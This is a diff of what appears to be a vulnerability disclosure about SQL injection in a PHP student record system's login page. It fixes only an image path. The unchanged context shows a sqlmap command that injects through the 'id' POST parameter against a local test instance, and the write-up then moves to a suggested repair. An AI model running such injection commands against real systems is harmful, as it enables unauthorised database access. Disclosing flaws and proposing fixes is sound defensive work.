@@ -70,7 +70,7 @@ Parameter: id (POST)
 python3 sqlmap.py -u "http://127.0.0.1/Student-Record-Management-System-PHP/login.php" --data="id=ad&password=123456&submit=login" -p id --batch --current-db
 ```
 
-![image-20250520182236491](images\image-20250520182236491.png)
+![image-20250520182236491](images/image-20250520182236491.png)
 
 # Suggested repair
 
